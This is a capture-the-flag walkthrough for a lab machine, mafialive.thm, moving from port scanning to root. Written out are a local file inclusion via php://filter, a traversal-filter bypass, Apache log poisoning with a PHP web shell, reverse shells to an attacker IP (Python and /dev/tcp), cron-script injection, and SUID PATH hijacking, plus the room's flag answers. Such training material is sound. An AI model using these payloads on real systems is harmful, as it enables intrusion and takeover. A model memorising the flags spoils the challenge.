<h2>Recon</h2>

<h3>PortScanning</h3>

command:```sudo nmap -A -T4 -p- -v```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 09:52 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Initiating Ping Scan at 09:52
Scanning 10.10.38.115 [4 ports]
Completed Ping Scan at 09:52, 0.22s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:52
Scanning mafialive.thm (10.10.38.115) [65535 ports]
Discovered open port 80/tcp on 10.10.38.115
Discovered open port 22/tcp on 10.10.38.115
Increasing send delay for 10.10.38.115 from 0 to 5 due to 1091 out of 2727 dropped probes since last increase.
Increasing send delay for 10.10.38.115 from 5 to 10 due to 36 out of 89 dropped probes since last increase.
SYN Stealth Scan Timing: About 10.80% done; ETC: 09:57 (0:04:16 remaining)
SYN Stealth Scan Timing: About 13.20% done; ETC: 10:00 (0:06:41 remaining)
SYN Stealth Scan Timing: About 16.43% done; ETC: 10:01 (0:07:43 remaining)
SYN Stealth Scan Timing: About 19.61% done; ETC: 10:02 (0:08:16 remaining)
SYN Stealth Scan Timing: About 24.89% done; ETC: 10:04 (0:08:48 remaining)
SYN Stealth Scan Timing: About 31.48% done; ETC: 10:06 (0:09:24 remaining)
SYN Stealth Scan Timing: About 32.74% done; ETC: 10:07 (0:10:06 remaining)
SYN Stealth Scan Timing: About 39.58% done; ETC: 10:07 (0:09:20 remaining)
SYN Stealth Scan Timing: About 44.06% done; ETC: 10:07 (0:08:32 remaining)
SYN Stealth Scan Timing: About 48.74% done; ETC: 10:07 (0:07:45 remaining)
SYN Stealth Scan Timing: About 53.87% done; ETC: 10:07 (0:06:57 remaining)
SYN Stealth Scan Timing: About 58.61% done; ETC: 10:07 (0:06:11 remaining)
SYN Stealth Scan Timing: About 63.76% done; ETC: 10:07 (0:05:25 remaining)
SYN Stealth Scan Timing: About 69.23% done; ETC: 10:07 (0:04:38 remaining)
SYN Stealth Scan Timing: About 75.62% done; ETC: 10:08 (0:03:52 remaining)
SYN Stealth Scan Timing: About 80.75% done; ETC: 10:08 (0:03:03 remaining)
SYN Stealth Scan Timing: About 85.91% done; ETC: 10:08 (0:02:13 remaining)
SYN Stealth Scan Timing: About 90.99% done; ETC: 10:08 (0:01:25 remaining)
SYN Stealth Scan Timing: About 96.06% done; ETC: 10:08 (0:00:37 remaining)
Completed SYN Stealth Scan at 10:08, 984.48s elapsed (65535 total ports)
Initiating Service scan at 10:08
Scanning 2 services on mafialive.thm (10.10.38.115)
Completed Service scan at 10:09, 6.38s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against mafialive.thm (10.10.38.115)
Retrying OS detection (try #2) against mafialive.thm (10.10.38.115)
Retrying OS detection (try #3) against mafialive.thm (10.10.38.115)
Retrying OS detection (try #4) against mafialive.thm (10.10.38.115)
Retrying OS detection (try #5) against mafialive.thm (10.10.38.115)
Initiating Traceroute at 10:09
Completed Traceroute at 10:09, 0.21s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:09
Completed Parallel DNS resolution of 1 host. at 10:09, 0.03s elapsed
NSE: Script scanning 10.10.38.115.
Initiating NSE at 10:09
Completed NSE at 10:09, 5.45s elapsed
Initiating NSE at 10:09
Completed NSE at 10:09, 0.82s elapsed
Initiating NSE at 10:09
Completed NSE at 10:09, 0.00s elapsed
Nmap scan report for mafialive.thm (10.10.38.115)
Host is up (0.16s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)
|   256 637327c76104256a08707a36b2f2840d (ECDSA)
|_  256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/test.php
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/3%OT=22%CT=1%CU=35614%PV=Y%DS=2%DC=T%G=Y%TM=6401B942
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=101%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11
OS:NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 45.341 days (since Tue Jan 17 01:58:39 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   203.24 ms 10.18.0.1
2   203.35 ms mafialive.thm (10.10.38.115)

NSE: Script Post-scanning.
Initiating NSE at 10:09
Completed NSE at 10:09, 0.00s elapsed
Initiating NSE at 10:09
Completed NSE at 10:09, 0.00s elapsed
Initiating NSE at 10:09
Completed NSE at 10:09, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1012.96 seconds
           Raw packets sent: 86344 (3.804MB) | Rcvd: 68152 (2.733MB)
```
We have 2 ports opened. Open the web page (running on port 80) on any browser of your choice

![image](https://user-images.githubusercontent.com/67879936/222671044-e6c67ffa-2728-4bad-90c0-66d14c6fd72e.png)

Answering the Questions that were asked

_#Getting a shell_

1. Looking at the support email address (support@mafialive.thm), you will observe that it clearly shows another hostname. So, all we need is to add the hostname to our /etc/hosts file alongside the IP address of the machine.

command used: ```nano /etc/hosts```

I guess this answered our first question.


2. Find Flag 1

Going over to the domain name we added to our /etc/hosts file, that got our first flag.

![image](https://user-images.githubusercontent.com/67879936/222671788-cc86e35f-4408-4f1e-aa5d-24ec757f027f.png)

flag: ``` thm{f0und_th3_r1ght_h0st_n4m3} ```


3. Look for a page under development
To answer this question all you have to do is run gobuster

command:```gobuster dir -u mafialive.thm -w /usr/share/dirb/wordlists/common.txt -t 16 -x php,txt,html,zip```

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ gobuster dir -u mafialive.thm -w /usr/share/dirb/wordlists/common.txt -t 16 -x php,txt,html,zip
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mafialive.thm
[+] Method:                  GET
[+] Threads:                 16
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
2023/03/03 09:37:04 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 59]
/index.html           (Status: 200) [Size: 59]
/robots.txt           (Status: 200) [Size: 34]
/robots.txt           (Status: 200) [Size: 34]
/server-status        (Status: 403) [Size: 278]
/test.php             (Status: 200) [Size: 286]
Progress: 23050 / 23075 (99.89%)
===============================================================
2023/03/03 09:42:34 Finished
===============================================================
```
The scan above reveals robots.txt and /test.php. And Robots.txt disallows test.php.

Going over to ```/test.php```

![image](https://user-images.githubusercontent.com/67879936/222672372-7b9bfeb4-ec49-493a-a3ac-5167abf0d7c7.png)

Clicking on the button reveals that test.php is under development

![image](https://user-images.githubusercontent.com/67879936/222672470-3a52bd03-bf7a-41cd-ade3-912715640e66.png)

I guess this answers our third question



4. Find flag 2

The button on the test.php page is revealing this url

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
```

With this url displayed I think we got oursleves an LFI(Local File Inclusion)

To be able to read the source code we can use a PHP wrapper filter. In this case we will use the one that encodes the content in base64

If you want to read more on PHP wrapper filter you can use this [link]([PayloadsAllTheThings — Wrapper php://filter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter))

Here is how we can actually use it for our host

command: ```http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php```

Now, using the PHP wrapper filter that encodes content in base64

![image](https://user-images.githubusercontent.com/67879936/222673029-4588c9ae-66c2-4dcc-8050-efb8646b623d.png)

We got a base64 encoded text, we can go ahead to decode it to confirm if it is still the same page

![image](https://user-images.githubusercontent.com/67879936/222673213-554175cb-8a9a-4c8c-8135-9f15f58869cc.png)

command:```echo “PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==” | base64 — decode```

Now, lets try this on /test.php (the one we tried earlier was on mrrobot.php)

url: ```http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php```

![image](https://user-images.githubusercontent.com/67879936/222673661-fbea35e1-6564-4b18-9c07-7519e6b95b4c.png)

Well, we got ourselves another base64 encoded text. Let’s try decoding this

command:```echo “base64” | base64 — decode```

Decoding the text we found this

![image](https://user-images.githubusercontent.com/67879936/222675222-ba5ca4c9-d640-4f35-9c61-a1cc65f20896.png)

Flag2:```thm{explo1t1ng_lf1}```



5. Get a shell and find the user flag

Now, since we got ourselves an LFI(Local File Inclusion), let’s try to read the /etc/passwd file. I want you to note that there's a filter that filters out ```../../../``` so it shouldn't contain that, so to bypass that we'll be using 2 dots and a dot, something like this ```.././.././```

url:```http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../etc/passwd```


![image](https://user-images.githubusercontent.com/67879936/222675948-c66c14b6-feee-43c3-8d18-bfef3fcba19a.png)

seeing how we can view the /etc/passwd file, lets go ahead to check if we can access apache log

url: ```http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log```

![image](https://user-images.githubusercontent.com/67879936/222676031-b15c350a-e5bb-4204-b693-701c0425a2a4.png)


Now, since we can access the apache log, lets try to poison the log.

To do this I will use netcat and curl

To poison the log

command: ```nc mafialive.thm 80```

After doing this I will inject a php payload

payload:```GET <?php system($_GET[‘cmd’]);?> HTTP/1.1```

![image](https://user-images.githubusercontent.com/67879936/222676327-8bcd4032-3fb8-4dce-bbf0-bbacdda46d72.png)

Now, you will get a response saying “Bad Request”

Lets go ahead to check if we were able to poison the log

command: ```curl -s “http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log&cmd=id"```

![image](https://user-images.githubusercontent.com/67879936/222676579-cdb9fa67-a24f-405c-a20f-3d3d760f80b1.png)

Taking a look at the ending of the screenshot above you will see a user “www-data”. Now, this means the log poisoning was successful.

We can now use a python reverse shell, so we can get a reverse shell on our machine (url encode the payload, I did this using cyber chef)

Encoded payload:```python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.18.103.121%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/sh%22)’```

Then we will also have to set up a listener on our machine

```rlwrap nc -lvnp 1234```

Now, all we have left is to add the payload to our url and we wait to get a reverse shell

command:```curl -s “http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log&cmd=python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.18.103.121%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/sh%22)'"```

![image](https://user-images.githubusercontent.com/67879936/222677190-4df8a6bc-4838-4427-ba05-4aaf2260c80e.png)

After running that command, a reverse shell was gotten

![image](https://user-images.githubusercontent.com/67879936/222677290-0d4b28b8-1154-4eef-a922-3d4c27cd88af.png)


We can stabilize this shell using the following command

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=screen
```

![image](https://user-images.githubusercontent.com/67879936/222677418-6c075ea5-7995-4740-8b4e-8f516339c3af.png)

Now, let’s go ahead to grab the user’s flag

Now, I do use the find command to actually look for flags because it basically looks for the flag and gives me the path to the flag. I do this because it’s not every time the flag is always located in the home directory

command:```find / 2>/dev/null | grep -i “user.txt”```

![image](https://user-images.githubusercontent.com/67879936/222677796-f6aa59d9-6dc0-4d97-9a59-270e7bc906a6.png)

User Flag:```thm{lf1_t0_rc3_1s_tr1cky}```

From the screenshot above you will observe that after running the find command, it showed us the path where the flag is located.

Using the cat command, we got access to the flag.


#Root the machine

Our focus here will be privilege escalation

1. Getting user 2 flag

There is a cronjob running on the system

command:```cat /etc/crontab```

![image](https://user-images.githubusercontent.com/67879936/222678675-2cfe6385-ad63-459b-ac4f-7525b8b7f2b2.png)

From the above screenshot we can see that /opt/helloworld.sh is running as a cron job as user “archangel” and we can write to it. So, all we have to do is inject a reverse shell and start another netcat listener

reverse shell:```/bin/bash -i >& /dev/tcp/10.18.103.121/1337 0>&1```

command:```echo “/bin/bash -i >& /dev/tcp/10.18.103.121/1337 0>&1” >> /opt/helloworld.sh```

![image](https://user-images.githubusercontent.com/67879936/222678836-36c62a45-9ec0-4e50-999a-1ecad51161d1.png)

Then we start a netcat listener for incoming connections

netcat listener:```rlwrap nc -lvnp 1337```

![image](https://user-images.githubusercontent.com/67879936/222678927-e529fb6e-60a0-4eae-883c-8741e98cbf01.png)

From the above screenshot you can see that we got a shell as user “archangel”

Now, to look for the user 2 flag we run the find command

command:```find / 2>/dev/null | grep -i “user2.txt”```

![image](https://user-images.githubusercontent.com/67879936/222679116-83fadb7e-f3f9-4585-b94f-d3774a9ee77c.png)

User2 Flag:```thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}```

Now that we have gotten the flag for this task let’s move on to the last task


2. Root the machine and find the root flag

We will use the find command to search for suid binaries

command:```find / -perm -u=s -type f 2>/dev/null```

![image](https://user-images.githubusercontent.com/67879936/222679436-fa12b443-599f-4abb-b26a-e75eb88925fd.png)

Now, _/home/archangel/secret/backup_ is an unusual binary so lets go check it out.

![image](https://user-images.githubusercontent.com/67879936/222679597-3c85ab3c-d563-4f4b-ba2e-e3d5a9683777.png)

As we can see from the above screenshot Seems there is a “setuid” so that archangel can write to _/opt_ but the cp binary is called with a relative name instead of the absolute path. So, we can go ahead to make it called a controlled one.

Hence, we have to use these commands

```
TD=$(mktemp -d)
echo ‘/bin/sh’ > “$TD/cp”
chmod a+x “$TD/cp”
export PATH=$TD:$PATH
export PATH=$TD:$PATH
secret/backup
```
![image](https://user-images.githubusercontent.com/67879936/222679803-15f2c1e6-aae4-4b13-8afb-c0126bbb9960.png)

Now, after running those commands we got the root shell.

Lastly, lets grab the root flag

![image](https://user-images.githubusercontent.com/67879936/222679872-6c93001e-e810-46f5-b86d-82ab14cdf47b.png)

Root Flag:```thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}```

That will be all for today
<br> <br>
[Back To Home](../../index.md)



































